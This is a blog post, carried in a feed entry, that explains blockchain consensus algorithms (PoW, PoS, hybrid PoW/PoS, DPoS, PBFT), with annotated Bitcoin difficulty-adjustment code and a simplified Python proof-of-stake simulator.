      <description>&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;Hello! It&amp;#x2019;s bekim.&lt;/p&gt;
</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Hello! It&#x2019;s bekim.</p><p>In my previous post, I briefly explained that transactions in the Bitcoin network become possible by adding new blocks through a mechanism called &#x201C;Proof of Work.&#x201D;. But, PoW isn\&#x2019;t the only consensus algorithm available. Actually there are actually many different consensus algorithms used in blockchain systems.<br>A consensus algorithm is basically the mechanism by which participants in a blockchain network agree on choosing a single valid block and maintaining the chain.<br>In this post, I&#x2019;ll introduce various consensus algorithms: PoW, PoS, DPoS, PBFT, and Hybrid PoW/PoS.<br><img src="/2025/03/09/bekim/consensus_algorithm/en/image.png" alt></p><h1 id="1-Proof-of-Work-PoW"><a href="#1-Proof-of-Work-PoW" class="headerlink" title="1. Proof of Work  (PoW)"></a>1. Proof of Work  (PoW)</h1><p>To explain this a bit further, Proof of Work is a method where participants (miners) need to find a hash value that meets a specific difficulty requirement. This mechanism was first introduced by Bitcoin. Miners repeatedly adjust a Nonce value, attempting to find a hash that matches the target difficulty.<br>Bitcoin aims to generate a new block roughly every 10 minutes. To keep this timing consistent, the network automatically adjusts the mining difficulty approximately every two weeks (every 2016 blocks)<br>Now, let&#x2019;s take a closer look at how Proof of Work (PoW) functions in Bitcoin&#x2019;s latest implementation.<br><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GetNextWorkRequired</span><span class="hljs-params">(<span class="hljs-keyword">const</span> CBlockIndex* pindexLast, <span class="hljs-keyword">const</span> CBlockHeader *pblock, <span class="hljs-keyword">const</span> Consensus::Params&amp; params)</span></span><span class="hljs-function"></span>{    assert(pindexLast != <span class="hljs-literal">nullptr</span>);    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> nProofOfWorkLimit = UintToArith256(params.powLimit).GetCompact();<span class="hljs-comment">// Only change once per difficulty adjustment interval</span>    <span class="hljs-comment">// [1] </span>    <span class="hljs-keyword">if</span> ((pindexLast-&gt;nHeight+<span class="hljs-number">1</span>) % params.DifficultyAdjustmentInterval() != <span class="hljs-number">0</span>)    {        <span class="hljs-keyword">if</span> (params.fPowAllowMinDifficultyBlocks)        {            <span class="hljs-comment">// Special difficulty rule for testnet:</span>            <span class="hljs-comment">// If the new block&apos;s timestamp is more than 2* 10 minutes</span>            <span class="hljs-comment">// then allow mining of a min-difficulty block.</span>            <span class="hljs-comment">// [2]</span>            <span class="hljs-keyword">if</span> (pblock-&gt;GetBlockTime() &gt; pindexLast-&gt;GetBlockTime() + params.nPowTargetSpacing*<span class="hljs-number">2</span>)                <span class="hljs-keyword">return</span> nProofOfWorkLimit;            <span class="hljs-keyword">else</span>            {                <span class="hljs-comment">// Return the last non-special-min-difficulty-rules-block</span>                <span class="hljs-comment">// [3]</span>                <span class="hljs-keyword">const</span> CBlockIndex* pindex = pindexLast;                <span class="hljs-keyword">while</span> (pindex-&gt;pprev &amp;&amp; pindex-&gt;nHeight % params.DifficultyAdjustmentInterval() != <span class="hljs-number">0</span> &amp;&amp; pindex-&gt;nBits == nProofOfWorkLimit)                    pindex = pindex-&gt;pprev;                <span class="hljs-keyword">return</span> pindex-&gt;nBits;            }        }        <span class="hljs-comment">// [4]</span>        <span class="hljs-keyword">return</span> pindexLast-&gt;nBits;    }    <span class="hljs-comment">// Go back by what we want to be 14 days worth of blocks</span>    <span class="hljs-comment">// [5]</span>    <span class="hljs-keyword">int</span> nHeightFirst = pindexLast-&gt;nHeight - (params.DifficultyAdjustmentInterval()<span class="hljs-number">-1</span>);    assert(nHeightFirst &gt;= <span class="hljs-number">0</span>);    <span class="hljs-keyword">const</span> CBlockIndex* pindexFirst = pindexLast-&gt;GetAncestor(nHeightFirst);    assert(pindexFirst);    <span class="hljs-keyword">return</span> CalculateNextWorkRequired(pindexLast, pindexFirst-&gt;GetBlockTime(), params);}</code></pre><br>[1] Bitcoin adjusts the mining difficulty approximately every two weeks (every 2016 blocks). If the next block&#x2019;s height (<code>pindexLast-&gt;nHeight+1</code>) is not a multiple of 2016 (<code>params.DifficultyAdjustmentInterval()</code>), Bitcoin retains the difficulty level (<code>pindexLast-&gt;nBits</code>)[4] from the previous block without any adjustment.<br>[2]In Bitcoin&#x2019;s Testnet, there is an exception rule: if no new block is generated for 20 minutes (twice the normal 10-minute interval), the network temporarily reduces the difficulty to its minimum value (<code>nProofOfWorkLimit</code>).<br>[3] Even after this temporary minimum difficulty adjustment on Testnet, once miners successfully generate subsequent blocks, the difficulty returns to its previous normal level. This is done by tracking backwards through recent blocks to find the most recent valid difficulty value</p><pre><code class="hljs cpp"><span class="hljs-keyword">const</span> CBlockIndex* pindex = pindexLast;<span class="hljs-keyword">while</span> (pindex-&gt;pprev &amp;&amp; pindex-&gt;nHeight % params.DifficultyAdjustmentInterval() != <span class="hljs-number">0</span> &amp;&amp; pindex-&gt;nBits == nProofOfWorkLimit)    pindex = pindex-&gt;pprev;<span class="hljs-keyword">return</span> pindex-&gt;nBits;</code></pre><p>For this purpose, Bitcoin checks the most recently added block (<code>pindexLast</code>) and traces back from there. While traversing backward through previous blocks, Bitcoin skips blocks where the difficulty was temporarily reduced to the minimum (<code>pindex-&gt;nBits == nProofOfWorkLimit</code>). Specifically, it continues moving backward through blocks that haven&#x2019;t yet reached the difficulty adjustment interval (<code>pindex-&gt;nHeight % params.DifficultyAdjustmentInterval() != 0</code>) until it finds a block where an actual difficulty adjustment occurred. At that point, it stops searching and uses that block&#x2019;s difficulty as a reference.</p><p>[5] However, if the current block height (<code>pindexLast-&gt;nHeight</code>) is a multiple of the difficulty adjustment interval (2016 blocks), Bitcoin recalculates the difficulty level instead of using the previous one.</p><hr><p>Bitcoin is designed so that if the previous 2016 blocks were generated faster than expected, the difficulty increases. On the other hand, if those blocks were generated more slowly than expected, the difficulty is lowered.<br><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">CalculateNextWorkRequired</span><span class="hljs-params">(<span class="hljs-keyword">const</span> CBlockIndex* pindexLast, <span class="hljs-keyword">int64_t</span> nFirstBlockTime, <span class="hljs-keyword">const</span> Consensus::Params&amp; params)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">if</span> (params.fPowNoRetargeting)        <span class="hljs-keyword">return</span> pindexLast-&gt;nBits;    <span class="hljs-comment">// Limit adjustment step</span>    <span class="hljs-comment">// [1]</span>    <span class="hljs-keyword">int64_t</span> nActualTimespan = pindexLast-&gt;GetBlockTime() - nFirstBlockTime;    <span class="hljs-comment">// [2]</span>    <span class="hljs-keyword">if</span> (nActualTimespan &lt; params.nPowTargetTimespan/<span class="hljs-number">4</span>)        nActualTimespan = params.nPowTargetTimespan/<span class="hljs-number">4</span>;    <span class="hljs-keyword">if</span> (nActualTimespan &gt; params.nPowTargetTimespan*<span class="hljs-number">4</span>)        nActualTimespan = params.nPowTargetTimespan*<span class="hljs-number">4</span>;    <span class="hljs-comment">// Retarget</span>    <span class="hljs-keyword">const</span> arith_uint256 bnPowLimit = UintToArith256(params.powLimit);    arith_uint256 bnNew;    <span class="hljs-comment">// Special difficulty rule for Testnet4</span>    <span class="hljs-comment">// [3]</span>    <span class="hljs-keyword">if</span> (params.enforce_BIP94) {        <span class="hljs-comment">// Here we use the first block of the difficulty period. This way</span>        <span class="hljs-comment">// the real difficulty is always preserved in the first block as</span>        <span class="hljs-comment">// it is not allowed to use the min-difficulty exception.</span>        <span class="hljs-keyword">int</span> nHeightFirst = pindexLast-&gt;nHeight - (params.DifficultyAdjustmentInterval()<span class="hljs-number">-1</span>);        <span class="hljs-keyword">const</span> CBlockIndex* pindexFirst = pindexLast-&gt;GetAncestor(nHeightFirst);        bnNew.SetCompact(pindexFirst-&gt;nBits);    } <span class="hljs-keyword">else</span> {        bnNew.SetCompact(pindexLast-&gt;nBits);    }<span class="hljs-comment">// [4]</span>    bnNew *= nActualTimespan;    bnNew /= params.nPowTargetTimespan;<span class="hljs-comment">// [5]</span>    <span class="hljs-keyword">if</span> (bnNew &gt; bnPowLimit)        bnNew = bnPowLimit;    <span class="hljs-keyword">return</span> bnNew.GetCompact();}</code></pre><br>[1] First, The network compares the timestamp of the latest block (<code>pindexLast-&gt;GetBlockTime()</code>) with the timestamp from 2016 blocks ago (<code>nFirstBlockTime</code>) to calculate the actual time taken to generate the previous 2016 blocks, storing this result in <code>nActualTimespan</code>. This value serves as the basis for adjusting the difficulty later.<br><pre><code class="hljs cpp"><span class="hljs-keyword">int64_t</span> nActualTimespan = pindexLast-&gt;GetBlockTime() - nFirstBlockTime;</code></pre></p><p>[2] Bitcoin measures <code>nActualTimespan</code> and compares it to the target time (<code>params.nPowTargetTimespan</code>) to adjust the difficulty. To prevent drastic changes in difficulty, the adjustment is limited&#x2014;difficulty can only increase up to 1/4 of the target time or decrease up to 4 times the target time.<br><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (nActualTimespan &lt; params.nPowTargetTimespan/<span class="hljs-number">4</span>)    nActualTimespan = params.nPowTargetTimespan/<span class="hljs-number">4</span>;<span class="hljs-keyword">if</span> (nActualTimespan &gt; params.nPowTargetTimespan*<span class="hljs-number">4</span>)    nActualTimespan = params.nPowTargetTimespan*<span class="hljs-number">4</span>;</code></pre><br>This limitation helps prevent sudden fluctuations in the network.<br>The process of determining the reference block for difficulty adjustment depends on the value of <code>params.enforce_BIP94</code>.<br>If this rule is applied, the difficulty of the block 2016 blocks before the current one (<code>pindexFirst-&gt;nBits</code>) is used as the reference. This helps prevent exceptional cases where the difficulty could drop to the minimum value. If the rule is not applied, the difficulty of the current block (<code>pindexLast-&gt;nBits</code>) is used instead.<br>This approach helps prevent the difficulty from dropping abnormally low in environments like Testnet.<br><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (params.enforce_BIP94) {    <span class="hljs-comment">// Here we use the first block of the difficulty period. This way</span>    <span class="hljs-comment">// the real difficulty is always preserved in the first block as</span>    <span class="hljs-comment">// it is not allowed to use the min-difficulty exception.</span>    <span class="hljs-keyword">int</span> nHeightFirst = pindexLast-&gt;nHeight - (params.DifficultyAdjustmentInterval()<span class="hljs-number">-1</span>);    <span class="hljs-keyword">const</span> CBlockIndex* pindexFirst = pindexLast-&gt;GetAncestor(nHeightFirst);    bnNew.SetCompact(pindexFirst-&gt;nBits);} <span class="hljs-keyword">else</span> {    bnNew.SetCompact(pindexLast-&gt;nBits);}</code></pre></p><blockquote><p>BIP (Bitcoin Improvement Proposal): A proposal for improving the Bitcoin protocol. BIP94 is one of these proposals and is designed to prevent the difficulty from dropping excessively in certain networks (such as Testnet4) during difficulty adjustments.</p></blockquote><p>[4] After that, Bitcoin calculates the new difficulty using the <code>nActualTimespan</code> value. Bitcoin sets the target block generation time to 10 minutes, and assuming 2016 blocks are created, the target time (<code>params.nPowTargetTimespan</code>) is approximately two weeks (1,209,600 seconds). The difficulty is then adjusted based on the ratio between the actual block generation time and the target time.<br><pre><code class="hljs cpp">bnNew *= nActualTimespan;bnNew /= params.nPowTargetTimespan;</code></pre><br>In other words, the new difficulty is adjusted using the formula:<br><em>New Difficulty = (Current Difficulty &#xD7; Actual Time Taken) / Target Time</em></p><p>By applying this formula, Bitcoin ensures that the average block generation time stays around 10 minutes.<br>[5] Plus, to prevent the difficulty from dropping too low, it is restricted from falling below the minimum difficulty (<code>bnPowLimit</code>).<br><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (bnNew &gt; bnPowLimit)    bnNew = bnPowLimit;</code></pre><br>The calculated difficulty is then applied to the next block, and miners must solve for this target value.<br>However, as mentioned in a previous post, the PoW method requires a massive amount of computation, which means it uses a ton of energy.<br>On top of that, with the rise of large-scale mining pools, there is a risk that one group could control more than 51% of the network&#x2019;s hash power<strong>.</strong> If that happens, they could manipulate transactions or even pull off a double-spending attack.<br>To overcome these limitations of PoW, the Proof of Stake (PoS) consensus algorithm was introduced.</p><h1 id="2-Proof-of-Stake-PoS"><a href="#2-Proof-of-Stake-PoS" class="headerlink" title="2. Proof of Stake (PoS)"></a>2. Proof of Stake (PoS)</h1><p>Proof of Stake (PoS) is a consensus algorithm that grants block creation and validation rights based on the amount of cryptocurrency a user holds and how long they&#x2019;ve held it.<br>In PoW, miners have to solve complex mathematical problems, but in PoS, users can participate as validators by staking a certain amount of the network&#x2019;s cryptocurrency. The more coins a validator stakes, the higher their chances of being selected to create a new block. PoS also enhances security through economic incentives. honest validators receive rewards, while those who engage in fraudulent activities face penalties, such as losing a portion of their staked funds.<br>The PoS concept was first implemented in Peercoin in 2012, and many blockchains have adopted it since then. In 2022, Ethereum also transitioned from PoW to PoS.<br><img src="/2025/03/09/bekim/consensus_algorithm/en/image1.png" alt><br>I was going to use Ethereum as an example to explain how PoS works, but analyzing its code would make this post way too long. So instead, let&#x2019;s break it down using a highly simplified version of the PoS consensus algorithm to understand the core principles.</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">import</span> time// [<span class="hljs-number">1</span>]<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Validator</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, address, stake</span>):</span>        self.address = address  <span class="hljs-comment"># Validator address</span>        self.stake = stake         self.vote_weight = stake          <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__repr__</span>(<span class="hljs-params">self</span>):</span>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Validator(<span class="hljs-subst">{self.address}</span>, Stake: <span class="hljs-subst">{self.stake}</span>)&quot;</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PoSBlockchain</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span>        self.validators = []         self.blocks = []        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">register_validator</span>(<span class="hljs-params">self, address, stake</span>):</span>        <span class="hljs-keyword">if</span> stake &lt; <span class="hljs-number">32</span>:            print(<span class="hljs-string">f&quot;[ERROR] <span class="hljs-subst">{address}</span> need to stake over 32 ETH&quot;</span>)            <span class="hljs-keyword">return</span>        validator = Validator(address, stake)        self.validators.append(validator)        print(<span class="hljs-string">f&quot;[INFO] <span class="hljs-subst">{validator}</span> registered as a validator.&quot;</span>)// [<span class="hljs-number">2</span>]    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">select_proposer</span>(<span class="hljs-params">self</span>):</span>        <span class="hljs-string">&quot;&quot;&quot; Randomly select a block proposer &quot;&quot;&quot;</span>        total_stake = sum(v.stake <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> self.validators)        rand_value = random.uniform(<span class="hljs-number">0</span>, total_stake)                cumulative = <span class="hljs-number">0</span>        <span class="hljs-keyword">for</span> validator <span class="hljs-keyword">in</span> self.validators:            cumulative += validator.stake            <span class="hljs-keyword">if</span> rand_value &lt;= cumulative:                print(<span class="hljs-string">f&quot;[INFO] selected validator: <span class="hljs-subst">{validator.address}</span>&quot;</span>)                <span class="hljs-keyword">return</span> validator// [<span class="hljs-number">3</span>]    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_block</span>(<span class="hljs-params">self, proposer</span>):</span>        <span class="hljs-string">&quot;&quot;&quot; Generate a block and calculate hash &quot;&quot;&quot;</span>        prev_hash = self.blocks[<span class="hljs-number">-1</span>][<span class="hljs-string">&apos;hash&apos;</span>] <span class="hljs-keyword">if</span> self.blocks <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;GENESIS&quot;</span>        timestamp = time.time()        block_data = <span class="hljs-string">f&quot;<span class="hljs-subst">{proposer.address}</span>-<span class="hljs-subst">{timestamp}</span>-<span class="hljs-subst">{prev_hash}</span>&quot;</span>        block_hash = hashlib.sha256(block_data.encode()).hexdigest()        block = {<span class="hljs-string">&quot;proposer&quot;</span>: proposer.address, <span class="hljs-string">&quot;hash&quot;</span>: block_hash, <span class="hljs-string">&quot;prev_hash&quot;</span>: prev_hash}        <span class="hljs-keyword">return</span> block// [<span class="hljs-number">4</span>]    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">validate_and_vote</span>(<span class="hljs-params">self, block</span>):</span>        votes = <span class="hljs-number">0</span>        <span class="hljs-keyword">for</span> validator <span class="hljs-keyword">in</span> self.validators:            <span class="hljs-keyword">if</span> random.random() &gt; <span class="hljs-number">0.1</span>:  <span class="hljs-comment"># 90% probability of a valid vote</span>                votes += validator.vote_weight                required_votes = sum(v.stake <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> self.validators) * <span class="hljs-number">0.67</span>  <span class="hljs-comment"># At least 67% approval required</span>        <span class="hljs-keyword">if</span> votes &gt;= required_votes:            self.blocks.append(block)            print(<span class="hljs-string">f&quot;[INFO] Validation: <span class="hljs-subst">{block[<span class="hljs-string">&apos;hash&apos;</span>]}</span>&quot;</span>)            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>        <span class="hljs-keyword">else</span>:            print(<span class="hljs-string">&quot;[WARNING] Not enough votes &quot;</span>)            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>// [<span class="hljs-number">5</span>]    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_consensus</span>(<span class="hljs-params">self</span>):</span>        proposer = self.select_proposer()        <span class="hljs-keyword">if</span> proposer:            new_block = self.create_block(proposer)            self.validate_and_vote(new_block)pos_chain = PoSBlockchain()pos_chain.register_validator(<span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-number">50</span>)pos_chain.register_validator(<span class="hljs-string">&quot;Bob&quot;</span>, <span class="hljs-number">40</span>)pos_chain.register_validator(<span class="hljs-string">&quot;Charlie&quot;</span>, <span class="hljs-number">32</span>)pos_chain.register_validator(<span class="hljs-string">&quot;Dave&quot;</span>, <span class="hljs-number">100</span>)<span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):    pos_chain.run_consensus()</code></pre><p>[1] In Ethereum, you need to stake 32 ETH to participate as a validator.<br><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Validator</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, address, stake</span>):</span>        self.address = address          self.stake = stake              <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__repr__</span>(<span class="hljs-params">self</span>):</span>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Validator(<span class="hljs-subst">{self.address}</span>, Stake: <span class="hljs-subst">{self.stake}</span>)&quot;</span></code></pre></p><p>[2] Participants who stake more coins have a higher chance of being selected as the next block validator, but the selection process also involves randomization algorithms to make it unpredictable and harder to manipulate<br><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">select_proposer</span>(<span class="hljs-params">self</span>):</span>    <span class="hljs-string">&quot;&quot;&quot;Select a block proposer randomly, weighted by stake&quot;&quot;&quot;</span>    total_stake = sum(v.stake <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> self.validators.values())    rand_value = random.uniform(<span class="hljs-number">0</span>, total_stake)    cumulative = <span class="hljs-number">0</span>    <span class="hljs-keyword">for</span> validator <span class="hljs-keyword">in</span> self.validators.values():        cumulative += validator.stake        <span class="hljs-keyword">if</span> rand_value &lt;= cumulative:            print(<span class="hljs-string">f&quot;[INFO] Selected proposer: <span class="hljs-subst">{validator.address}</span>&quot;</span>)            <span class="hljs-keyword">return</span> validator    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span></code></pre></p><p>[3] The selected validator bundles new transactions, creates a block, and proposes it to the blockchain.<br><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_block</span>(<span class="hljs-params">self, proposer</span>):</span>    <span class="hljs-string">&quot;&quot;&quot;Generate a new block&quot;&quot;&quot;</span>    prev_hash = self.blockchain[<span class="hljs-number">-1</span>][<span class="hljs-string">&apos;Hash&apos;</span>]    new_block = {        <span class="hljs-string">&quot;Index&quot;</span>: len(self.blockchain),        <span class="hljs-string">&quot;Timestamp&quot;</span>: str(datetime.now()),        <span class="hljs-string">&quot;PrevHash&quot;</span>: prev_hash,        <span class="hljs-string">&quot;Validator&quot;</span>: proposer.address    }    new_block[<span class="hljs-string">&quot;Hash&quot;</span>] = self.hash_block(new_block)    <span class="hljs-keyword">return</span> new_block</code></pre></p><p>[4] Other validators participate in the consensus process by verifying the block&#x2019;s validity and voting on it. In Ethereum, at least 128 validators must review and vote on a block. Once enough consensus is reached through this voting process, the block is added to the blockchain.<br><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">validate_and_vote</span>(<span class="hljs-params">self, block</span>):</span>    <span class="hljs-string">&quot;&quot;&quot;Simulate validator voting process&quot;&quot;&quot;</span>    total_stake = sum(v.stake <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> self.validators.values())    votes = sum(v.stake <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> self.validators.values() <span class="hljs-keyword">if</span> random.random() &gt; <span class="hljs-number">0.1</span>)  <span class="hljs-comment"># # 90% chance to approve</span>    <span class="hljs-keyword">if</span> votes &gt;= total_stake * <span class="hljs-number">0.67</span>:  <span class="hljs-comment"># Requires at least 67% approval </span>        self.blockchain.append(block)        print(<span class="hljs-string">f&quot;[INFO] Block added: <span class="hljs-subst">{block[<span class="hljs-string">&apos;Hash&apos;</span>]}</span>&quot;</span>)        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>    <span class="hljs-keyword">else</span>:        print(<span class="hljs-string">&quot;[WARNING] Block rejected due to insufficient votes.&quot;</span>)        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></code></pre></p><p>[5] Validators who successfully create a valid block receive transaction fees and network rewards as compensation.<br><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_consensus</span>(<span class="hljs-params">self</span>):</span>    <span class="hljs-string">&quot;&quot;&quot;Run the PoS consensus process&quot;&quot;&quot;</span>    proposer = self.select_proposer()    <span class="hljs-keyword">if</span> proposer:        new_block = self.create_block(proposer)        self.validate_and_vote(new_block)        proposer.stake += <span class="hljs-number">5</span>  <span class="hljs-comment"># reward</span>        print(<span class="hljs-string">f&quot;[INFO] <span class="hljs-subst">{proposer.address}</span> received 5 ETH as a reward.&quot;</span>)</code></pre><br>If a validator engages in dishonest behavior or fails to perform the required validation tasks, they face penalties. For example, if a validator goes offline and fails to validate blocks, they may receive reduced rewards or have a portion of their staked funds slashed. In more severe cases, such as double signing or approving an invalid block, the validator can be slashed, meaning they lose some or even all of their staked funds and get removed from the network.</p><p>Because of this system, PoS helps maintain the security and integrity of the network while being more energy-efficient than PoW. However, PoS has its own limitations. Those who hold more coins tend to have a continuous advantage, leading to potential centralization risks in the network.</p><h1 id="3-Hybrid-PoW-PoS"><a href="#3-Hybrid-PoW-PoS" class="headerlink" title="3. Hybrid PoW/PoS"></a>3. Hybrid PoW/PoS</h1><p><img src="/2025/03/09/bekim/consensus_algorithm/en/image2.png" alt></p><blockquote><p>Complete Overview of Decred&#x2019;s Structure [Source: <a href="https://medium.com/decred/blockchain-governance-how-decred-iterates-upon-bitcoin-3cc7030c655e">https://medium.com/decred/blockchain-governance-how-decred-iterates-upon-bitcoin-3cc7030c655e</a>]</p></blockquote><p>The traditional PoW provides high security but has high energy consumption and the issue of mining monopolization. On the other hand, the PoS method is energy-efficient but comes with the risk of validator monopoly. To solve this, the Hybrid PoW/PoS model emerged. In this method, PoW is used to generate blocks, while PoS validators approve them.<br>First, a miner performs computations using the Proof-of-Work method to create a new block. However, the created block is not immediately added to the chain but goes through a final approval process via the PoS validators&#x2019; vote. PoS validators participate by staking a certain amount of the cryptocurrency they hold, and randomly selected validators evaluate the validity of the block and vote on it. Typically, if at least 3 out of 5 validators approve, the block is validated and added to the blockchain. The rewards are distributed to both PoW miners and PoS validators. For example, in Decred (DCR), 60% of the reward is given to PoW miners, 30% goes to PoS validators, and the remaining 10% is allocated to the network development fund. Through this, excessive monopolization by PoW miners is prevented, and PoS validators are incentivized to actively participate in maintaining the network.<br>By combining PoW&#x2019;s high security with PoS&#x2019;s energy efficiency, this structure strengthens resistance against 51% attacks and mitigates validator centralization issues.</p><h1 id="4-DPoS-Delegated-Proof-of-Stake"><a href="#4-DPoS-Delegated-Proof-of-Stake" class="headerlink" title="4. DPoS (Delegated Proof of Stake)"></a>4. DPoS (Delegated Proof of Stake)</h1><p>Delegated Proof of Stake (DPoS) is an improved version of the traditional PoS consensus algorithm, designed to make transaction verification and block generation in blockchain networks more efficient. Instead of users directly creating blocks, DPoS allows them to elect delegates, who are then entrusted with the responsibility of validating transactions and generating blocks.<br><img src="/2025/03/09/bekim/consensus_algorithm/en/image3.png" alt><br>First, all token holders vote based on their stake to elect delegates. These elected delegates take turns generating and validating blocks in a fixed order, playing a key role in maintaining the network.</p><p>In this system, the integrity of the delegates is crucial. Voting is an ongoing process, and if a delegate fails to create blocks or engages in dishonest behavior, token holders can replace them through re-elections. Because DPoS operates in a more democratic manner and delegates take turns producing blocks, it achieves faster block finalization times, leading to better network performance. Additionally, since there is no mining competition, energy consumption is significantly lower compared to PoW. However, since the number of delegates is limited, DPoS carries a higher risk of centralization compared to PoW or PoS. If a small group of delegates collude, it could undermine the fairness of the network.</p><p>Notable DPoS-based blockchains include EOS and TRON, as well as projects like Steem and Lisk, which also utilize DPoS. In these systems, a fixed number of delegates manage the network and execute the consensus process efficiently.</p><h1 id="5-PBFT-Practical-Byzantine-Fault-Tolerance"><a href="#5-PBFT-Practical-Byzantine-Fault-Tolerance" class="headerlink" title="5. PBFT (Practical Byzantine Fault Tolerance)"></a>5. PBFT (Practical Byzantine Fault Tolerance)</h1><p>Those who have studied blockchain may have heard of the Byzantine Generals Problem.<br>The Byzantine fault tolerance problem was designed to address this issue and is described as follows:</p><ul><li>A group of Byzantine generals has surrounded an enemy city. They cannot communicate directly with each other and must rely on messengers to exchange information. The problem is that some of the generals might be <strong>traitors</strong>. Loyal generals need to either attack together or retreat together, but the traitors aim to create confusion, causing some to attack while others retreat, ultimately ruining the operation.</li><li>In this situation, loyal generals must achieve two key goals:<ul><li>All loyal generals must reach the same decision&#x2014;either they all attack or they all retreat.</li><li>The traitors must not be able to spread false information that leads to an incorrect decision.</li></ul></li><li>The loyal generals must maintain these two conditions under any circumstances. However, the traitors can do anything&#x2014;they can send false messages, alter communications, or deceive others in various ways.</li></ul><p>Thus, the generals need a reliable communication method (algorithm) that enables them to reach a correct agreement in any situation.<br>This is the essence of the &#x201C;Byzantine Generals Problem.&#x201D;<br>PBFT (Practical Byzantine Fault Tolerance) is a consensus algorithm designed to ensure secure agreement within a network, even if some nodes fail to respond or provide incorrect information. In particular, when there are 3f + 1 nodes, the system can remain secure and functional even if up to f nodes are malicious (Byzantine). Unlike PoW or PoS, this consensus algorithm does not require computational competition. Instead, it operates based on a voting system, allowing for faster transaction finality.<br><img src="/2025/03/09/bekim/consensus_algorithm/en/image4.png" alt></p><blockquote><p>Figure 1. Byzantine Generals Problem Image [Source: Attached research paper]</p></blockquote><p>PBFT consists of clients and replicas, with one of the replicas acting as the leader (Primary) node. To achieve consensus, it follows a four-step protocol: Request, Pre-prepare, Prepare, and Commit. <em>(f: The number of nodes that can exhibit Byzantine faults)</em></p><ol><li><p><strong>Request</strong><br>The client sends a request to the leader node.</p></li><li><p><strong>Pre-Prepare</strong><br>The leader node broadcasts the request to all backup nodes. At this stage, if the leader node is malicious, it could propagate an incorrect request. However, the following steps will verify its validity.</p></li><li><p><strong>Prepare</strong><br>Each backup node verifies the Pre-Prepare message sent by the leader node and then broadcasts a PREPARE message to the other nodes. At this stage, a node considers the request trustworthy if it receives at least 2f + 1 PREPARE messages for the same request.</p></li><li><p><strong>Commit</strong><br>Each backup node considers the request trustworthy once it receives 2f + 1 PREPARE messages and then sends a COMMIT message to the other nodes. Nodes finalize the request when they receive 2f + 1 COMMIT messages for the same request.</p></li><li><p><strong>Reply</strong><br>The client confirms that the request has been successfully processed once it receives f + 1 matching responses.</p></li></ol><p>PBFT is a consensus algorithm that provides fast transaction finality and high security. Unlike PoW or PoS, it does not rely on computational competition and can maintain network stability even with up to one-third Byzantine faults. However, as the network grows, the consensus process slows down, making scalability a major limitation. PBFT is used in Hyperledger Fabric, Zilliqa, and other blockchain projects. It is considered a suitable consensus algorithm for private blockchains and small-scale node networks.<br>We&#x2019;ve explored 5 different blockchain consensus algorithms so far. Some were explained in detail, while others were covered more briefly. Since Proof of Work (PoW) and Proof of Stake (PoS) are the most familiar ones from my studies, I ended up writing a bit more about them.<br>Of course, there are many other consensus algorithms out there, but for today, I focused on these five well-known ones.<br>Thanks for reading this long post! If I come across more interesting topics, I&#x2019;ll make sure to summarize them again. &#x1F44B;</p><ul><li><strong>Reference</strong><br><a href="https://github.com/bitcoin/bitcoin">https://github.com/bitcoin/bitcoin</a><br><a href="https://github.com/ethereum/go-ethereum">https://github.com/ethereum/go-ethereum</a><br><a 